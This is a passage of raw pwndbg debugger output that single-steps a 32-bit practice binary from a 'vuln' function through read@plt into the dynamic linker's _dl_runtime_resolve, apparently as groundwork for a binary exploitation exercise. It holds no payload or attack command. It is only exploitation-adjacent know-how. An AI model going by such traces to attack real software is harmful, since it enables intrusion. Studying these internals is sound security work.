0x804851c &lt;vuln+49&gt; nop 0x804851d &lt;vuln+50&gt; leave 0x804851e &lt;vuln+51&gt; ret 0x804851f &lt;main&gt; lea ecx, [esp + 4] 0x8048523 &lt;main+4&gt; and esp, 0xfffffff0──────────────────────────────────────────[ STACK ]──────────────────────────────────────────00:0000│ esp 0xffffd090 ◂— 0x001:0004│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x102:0008│ 0xffffd098 ◂— 0x10003:000c│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x004:0010│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a05:0014│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...06:0018│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* &apos;GLIBC_2.0&apos; */07:001c│ eax ecx 0xffffd0ac ◂— 0x1────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────── ► f 0 80483a0 read@plt f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+2410x080483a0 in read@plt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x10 EIP 0x80483a0 (read@plt) ◂— jmp dword ptr [0x804a010]─────────────────────────────────────────[ DISASM ]────────────────────────────────────────── ► 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;──────────────────────────────────────────[ STACK ]──────────────────────────────────────────00:0000│ esp 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1001:0004│ 0xffffd090 ◂— 0x002:0008│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x103:000c│ 0xffffd098 ◂— 0x10004:0010│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x005:0014│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a06:0018│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...07:001c│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* &apos;GLIBC_2.0&apos; */────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────── ► f 0 80483a0 read@plt f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt; siLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x10 EIP 0x80483a0 (read@plt) ◂— jmp dword ptr [0x804a010]─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── ► 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1001:0004│ 0xffffd090 ◂— 0x002:0008│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x103:000c│ 0xffffd098 ◂— 0x10004:0010│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x005:0014│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a06:0018│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...07:001c│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* &apos;GLIBC_2.0&apos; */───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 80483a6 read@plt+6 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+2410x080483a6 in read@plt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x10 EIP 0x80483a6 (read@plt+6) ◂— push 8─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; ► 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1001:0004│ 0xffffd090 ◂— 0x002:0008│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x103:000c│ 0xffffd098 ◂— 0x10004:0010│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x005:0014│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a06:0018│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...07:001c│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* &apos;GLIBC_2.0&apos; */───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 80483a6 read@plt+6 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x10 EIP 0x80483a6 (read@plt+6) ◂— push 8─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; ► 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1001:0004│ 0xffffd090 ◂— 0x002:0008│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x103:000c│ 0xffffd098 ◂— 0x10004:0010│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x005:0014│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a06:0018│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...07:001c│ 0xffffd0a8 —▸ 0xf7fce410 —▸ 0x80482d9 ◂— inc edi /* &apos;GLIBC_2.0&apos; */───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 80483ab read@plt+11 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+2410x080483ab in read@plt ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd088 ◂— 0x8 EIP 0x80483ab (read@plt+11) —▸ 0xffffd0e9 ◂— 0x67ffffd1─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 ► 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd088 ◂— 0x801:0004│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1002:0008│ 0xffffd090 ◂— 0x003:000c│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x104:0010│ 0xffffd098 ◂— 0x10005:0014│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x006:0018│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a07:001c│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 80483ab read@plt+11 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt; x/10i 0x8048380 0x8048380: push DWORD PTR ds:0x804a004 0x8048386: jmp DWORD PTR ds:0x804a008 0x804838c: add BYTE PTR [eax],al 0x804838e: add BYTE PTR [eax],al 0x8048390 &lt;setbuf@plt&gt;: jmp DWORD PTR ds:0x804a00c 0x8048396 &lt;setbuf@plt+6&gt;: push 0x0 0x804839b &lt;setbuf@plt+11&gt;: jmp 0x8048380 0x80483a0 &lt;read@plt&gt;: jmp DWORD PTR ds:0x804a010 0x80483a6 &lt;read@plt+6&gt;: push 0x8=&gt; 0x80483ab &lt;read@plt+11&gt;: jmp 0x8048380pwndbg&gt; x/xw 0x804a0040x804a004: 0xf7ffd940pwndbg&gt;0x804a008: 0xf7fea340pwndbg&gt; siLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd088 ◂— 0x8 EIP 0x80483ab (read@plt+11) —▸ 0xffffd0e9 ◂— 0x67ffffd1─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 ► 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt; 0xf7fea350 &lt;_dl_runtime_resolve+16&gt; pop edx─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd088 ◂— 0x801:0004│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1002:0008│ 0xffffd090 ◂— 0x003:000c│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x104:0010│ 0xffffd098 ◂— 0x10005:0014│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x006:0018│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a07:001c│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048380 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+2410x08048380 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd088 ◂— 0x8 EIP 0x8048380 ◂— push dword ptr [0x804a004]─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ ► 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd088 ◂— 0x801:0004│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1002:0008│ 0xffffd090 ◂— 0x003:000c│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x104:0010│ 0xffffd098 ◂— 0x10005:0014│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x006:0018│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a07:001c│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048380 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd088 ◂— 0x8 EIP 0x8048380 ◂— push dword ptr [0x804a004]─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ ► 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd088 ◂— 0x801:0004│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1002:0008│ 0xffffd090 ◂— 0x003:000c│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x104:0010│ 0xffffd098 ◂— 0x10005:0014│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x006:0018│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a07:001c│ 0xffffd0a4 —▸ 0xf7ffdaf8 —▸ 0xf7ffda9c —▸ 0xf7fce3e0 —▸ 0xf7ffd940 ◂— ...───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048386 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+2410x08048386 in ?? ()LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd084 —▸ 0xf7ffd940 ◂— 0x0 EIP 0x8048386 ◂— jmp dword ptr [0x804a008]─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; ► 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd084 —▸ 0xf7ffd940 ◂— 0x001:0004│ 0xffffd088 ◂— 0x802:0008│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1003:000c│ 0xffffd090 ◂— 0x004:0010│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x105:0014│ 0xffffd098 ◂— 0x10006:0018│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x007:001c│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 8048386 f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241pwndbg&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd084 —▸ 0xf7ffd940 ◂— 0x0 EIP 0x8048386 ◂— jmp dword ptr [0x804a008]─────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────── 0x80483a0 &lt;read@plt&gt; jmp dword ptr [_GLOBAL_OFFSET_TABLE_+16] &lt;0x804a010&gt; 0x80483a6 &lt;read@plt+6&gt; push 8 0x80483ab &lt;read@plt+11&gt; jmp 0x8048380 ↓ 0x8048380 push dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt; ► 0x8048386 jmp dword ptr [0x804a008] &lt;0xf7fea340&gt; ↓ 0xf7fea340 &lt;_dl_runtime_resolve&gt; push eax 0xf7fea341 &lt;_dl_runtime_resolve+1&gt; push ecx 0xf7fea342 &lt;_dl_runtime_resolve+2&gt; push edx 0xf7fea343 &lt;_dl_runtime_resolve+3&gt; mov edx, dword ptr [esp + 0x10] 0xf7fea347 &lt;_dl_runtime_resolve+7&gt; mov eax, dword ptr [esp + 0xc] 0xf7fea34b &lt;_dl_runtime_resolve+11&gt; call _dl_fixup &lt;0xf7fe44f0&gt;─────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────00:0000│ esp 0xffffd084 —▸ 0xf7ffd940 ◂— 0x001:0004│ 0xffffd088 ◂— 0x802:0008│ 0xffffd08c —▸ 0x8048519 (vuln+46) ◂— add esp, 0x1003:000c│ 0xffffd090 ◂— 0x004:0010│ 0xffffd094 —▸ 0xffffd0ac ◂— 0x105:0014│ 0xffffd098 ◂— 0x10006:0018│ 0xffffd09c —▸ 0xf7ffd940 ◂— 0x007:001c│ 0xffffd0a0 —▸ 0xffffd0d4 —▸ 0xf7ddf728 ◂— 0x147a───────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────── ► f 0 f7fea340 _dl_runtime_resolve f 1 8048519 vuln+46 f 2 80485a7 main+136 f 3 f7deb9a1 __libc_start_main+241_dl_runtime_resolve () at ../sysdeps/i386/dl-trampoline.S:3535 ../sysdeps/i386/dl-trampoline.S: No such file or directory.LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA───────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────────────────────────────── EAX 0xffffd0ac ◂— 0x1 EBX 0x0 ECX 0xffffd0ac ◂— 0x1 EDX 0xf7fa989c (_IO_stdfile_0_lock) ◂— 0x0 EDI 0xffffd190 —▸ 0xffffd1b0 ◂— 0x1 ESI 0xf7fa8000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d5d8c EBP 0xffffd118 —▸ 0xffffd198 ◂— 0x0 ESP 0xffffd084 —▸ 0xf7ffd940 ◂— 0x0 